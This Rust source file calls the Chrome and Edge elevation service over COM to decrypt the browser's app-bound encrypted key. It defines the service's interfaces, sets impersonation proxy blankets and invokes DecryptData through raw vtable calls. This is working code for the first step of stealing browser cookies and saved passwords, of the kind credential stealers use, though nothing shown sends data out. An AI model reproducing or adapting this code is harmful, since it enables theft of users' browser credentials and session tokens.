#![allow(non_snake_case)]
use std::ffi::c_void;
use windows_core::{interface, BSTR, GUID, HRESULT, IUnknown, Result, IUnknown_Vtbl};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoUninitialize, CoSetProxyBlanket,
    CLSCTX_LOCAL_SERVER, COINIT_APARTMENTTHREADED, EOAC_DYNAMIC_CLOAKING,
    RPC_C_AUTHN_LEVEL, RPC_C_IMP_LEVEL,
};

const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFFFFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFFFFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;

#[link(name = "oleaut32")]
extern "system" {
    pub fn SysAllocStringByteLen(psz: *const u8, len: u32) -> *mut u16;
    pub fn SysStringByteLen(bstr: *const u16) -> u32;
    fn SysFreeString(bstr: *mut u16);
}

#[link(name = "ole32")]
extern "system" {
    #[link_name = "CoCreateInstance"]
    fn r_co_create_instance(
        rclsid: *const GUID,
        punkouter: *const c_void,
        dwclscontext: u32,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> HRESULT;

    #[link_name = "CoSetProxyBlanket"]
    fn r_co_set_proxy_blanket(
        pproxy: *mut c_void,
        dwauthn_svc: u32,
        dwauthz_svc: u32,
        pserver_princ_name: *const u16,
        dwauthn_level: u32,
        dwimp_level: u32,
        pauth_info: *const c_void,
        dwcapabilities: u32,
    ) -> HRESULT;
}

#[repr(u32)]
#[derive(Clone, Copy, Debug)]
pub enum ProtectionLevel {
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3,
}

#[interface("C9C2B807-7731-4F34-81B7-44FF7779522B")]
unsafe trait IEdgeElevatorFinal: IUnknown {
    unsafe fn EdgeBaseMethod1_Unknown(&self) -> HRESULT;
    unsafe fn EdgeBaseMethod2_Unknown(&self) -> HRESULT;
    unsafe fn EdgeBaseMethod3_Unknown(&self) -> HRESULT;

    unsafe fn RunRecoveryCRXElevated(&self, p1: *const u16, p2: *const u16, p3: *const u16, p4: *const u16, p5: u32, p6: *mut usize) -> HRESULT;
    unsafe fn EncryptData(&self, level: ProtectionLevel, data: BSTR, encrypted: *mut BSTR, error: *mut u32) -> HRESULT;
    unsafe fn DecryptData(&self, encrypted: BSTR, data: *mut BSTR, error: *mut u32) -> HRESULT;
}

#[interface("8F7B6792-784D-4047-845D-1782EFBEF205")]
unsafe trait IEdgeElevator2Final: IUnknown {
    unsafe fn EdgeBaseMethod1_Unknown(&self) -> HRESULT;
    unsafe fn EdgeBaseMethod2_Unknown(&self) -> HRESULT;
    unsafe fn EdgeBaseMethod3_Unknown(&self) -> HRESULT;

    unsafe fn RunRecoveryCRXElevated(&self, p1: *const u16, p2: *const u16, p3: *const u16, p4: *const u16, p5: u32, p6: *mut usize) -> HRESULT;
    unsafe fn EncryptData(&self, level: ProtectionLevel, data: BSTR, encrypted: *mut BSTR, error: *mut u32) -> HRESULT;
    unsafe fn DecryptData(&self, encrypted: BSTR, data: *mut BSTR, error: *mut u32) -> HRESULT;

    unsafe fn RunIsolatedChrome(&self, p1: *const u16, p2: *const u16, p3: *mut u32, p4: *mut usize) -> HRESULT;
    unsafe fn AcceptInvitation(&self, p1: *const u16) -> HRESULT;
}

unsafe fn c_create_with_iid(clsid: &GUID, iid: &GUID) -> Option<*mut c_void> {
    let mut ptr: *mut c_void = std::ptr::null_mut();
    let hr = r_co_create_instance(
        clsid as *const _,
        std::ptr::null(),
        4,
        iid as *const _,
        &mut ptr,
    );
    if hr.is_ok() && !ptr.is_null() { Some(ptr) } else { None }
}

unsafe fn c_set_proxy_blanket(ptr: *mut c_void) {
    let _ = r_co_set_proxy_blanket(
        ptr,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        -1isize as *const u16,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        std::ptr::null(),
        0x40,
    );
}

unsafe fn c_decrypt_data(
    iface_ptr: *mut c_void,
    bstr_enc: *const u16,
    bstr_plain: *mut *mut u16,
    com_err: *mut u32,
) -> HRESULT {
    let vtable: *const usize = *(iface_ptr as *const *const usize);
    let fn_ptr = *vtable.add(5);
    let decrypt: unsafe extern "system" fn(
        *mut c_void, *const u16, *mut *mut u16, *mut u32,
    ) -> HRESULT = std::mem::transmute(fn_ptr);
    decrypt(iface_ptr, bstr_enc, bstr_plain, com_err)
}

unsafe fn c_release(ptr: *mut c_void) {
    let vtable: *const usize = *(ptr as *const *const usize);
    let release: unsafe extern "system" fn(*mut c_void) -> u32 =
        std::mem::transmute(*vtable.add(2));
    release(ptr);
}

pub struct Elevator {
    initialized: bool,
}

impl Elevator {
    pub fn new() -> Self {
        unsafe {
            let res = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
            Self { initialized: res.is_ok() }
        }
    }

    pub fn decrypt_key(
        &self,
        encrypted_key: &[u8],
        clsid_guid: &GUID,
        iid_guid: &GUID,
        iid_v2_guid: Option<&GUID>,
        is_edge: bool,
    ) -> Result<Vec<u8>> {
        unsafe {
            if is_edge {
                self.d_key_edge(encrypted_key, clsid_guid, iid_v2_guid)
            } else {
                self.d_key_chromium(encrypted_key, clsid_guid, iid_guid, iid_v2_guid)
            }
        }
    }

    unsafe fn d_key_edge(
        &self,
        encrypted_key: &[u8],
        clsid_guid: &GUID,
        iid_v2_guid: Option<&GUID>,
    ) -> Result<Vec<u8>> {
        let bstr_enc_ptr = SysAllocStringByteLen(encrypted_key.as_ptr(), encrypted_key.len() as u32);
        if bstr_enc_ptr.is_null() {
            return Err(windows_core::Error::from(windows::Win32::Foundation::E_OUTOFMEMORY));
        }
        let bstr_enc = BSTR::from_raw(bstr_enc_ptr);
        let mut bstr_plain = BSTR::new();
        let mut com_err = 0u32;

        if iid_v2_guid.is_some() {
            let res: Result<IEdgeElevator2Final> = CoCreateInstance(clsid_guid, None, CLSCTX_LOCAL_SERVER);
            if let Ok(elevator) = res {
                let _ = CoSetProxyBlanket(
                    &*elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, Option::None,
                    RPC_C_AUTHN_LEVEL(RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
                    RPC_C_IMP_LEVEL(RPC_C_IMP_LEVEL_IMPERSONATE),
                    None, EOAC_DYNAMIC_CLOAKING,
                );
                if elevator.DecryptData(bstr_enc.clone(), &mut bstr_plain, &mut com_err).is_ok() {
                    return Ok(b_to_vec(bstr_plain));
                }
            }
        }

        let elevator: IEdgeElevatorFinal = CoCreateInstance(clsid_guid, None, CLSCTX_LOCAL_SERVER)?;
        let _ = CoSetProxyBlanket(
            &*elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, Option::None,
            RPC_C_AUTHN_LEVEL(RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
            RPC_C_IMP_LEVEL(RPC_C_IMP_LEVEL_IMPERSONATE),
            None, EOAC_DYNAMIC_CLOAKING,
        );
        elevator.DecryptData(bstr_enc, &mut bstr_plain, &mut com_err).ok()?;
        Ok(b_to_vec(bstr_plain))
    }

    unsafe fn d_key_chromium(
        &self,
        encrypted_key: &[u8],
        clsid_guid: &GUID,
        iid_guid: &GUID,
        iid_v2_guid: Option<&GUID>,
    ) -> Result<Vec<u8>> {
        let bstr_enc = SysAllocStringByteLen(encrypted_key.as_ptr(), encrypted_key.len() as u32);
        if bstr_enc.is_null() {
            return Err(windows_core::Error::from(windows::Win32::Foundation::E_OUTOFMEMORY));
        }

        let mut iface_ptr: *mut c_void = std::ptr::null_mut();

        if let Some(v2_iid) = iid_v2_guid {
            iface_ptr = c_create_with_iid(clsid_guid, v2_iid).unwrap_or(std::ptr::null_mut());
        }

        if iface_ptr.is_null() {
            match c_create_with_iid(clsid_guid, iid_guid) {
                Some(ptr) => iface_ptr = ptr,
                None => {
                    SysFreeString(bstr_enc);
                    return Err(windows_core::Error::from(windows::Win32::Foundation::E_FAIL));
                }
            }
        }

        c_set_proxy_blanket(iface_ptr);

        let mut bstr_plain: *mut u16 = std::ptr::null_mut();
        let mut com_err: u32 = 0;
        let hr = c_decrypt_data(iface_ptr, bstr_enc, &mut bstr_plain, &mut com_err);

        SysFreeString(bstr_enc);
        c_release(iface_ptr);

        if hr.is_err() || bstr_plain.is_null() {
            if !bstr_plain.is_null() {
                SysFreeString(bstr_plain);
            }
            return Err(windows_core::Error::from(windows::Win32::Foundation::E_FAIL));
        }

        let len = SysStringByteLen(bstr_plain);
        let result = if len > 0 {
            std::slice::from_raw_parts(bstr_plain as *const u8, len as usize).to_vec()
        } else {
            Vec::new()
        };
        SysFreeString(bstr_plain);
        Ok(result)
    }
}

impl Drop for Elevator {
    fn drop(&mut self) {
        if self.initialized {
            unsafe { CoUninitialize() };
        }
    }
}

unsafe fn b_to_vec(bstr: BSTR) -> Vec<u8> {
    let raw = bstr.as_wide().as_ptr();
    if raw.is_null() {
        return Vec::new();
    }
    let len = SysStringByteLen(raw);
    let ptr = raw as *const u8;
    if len == 0 {
        return Vec::new();
    }
    std::slice::from_raw_parts(ptr, len as usize).to_vec()
}
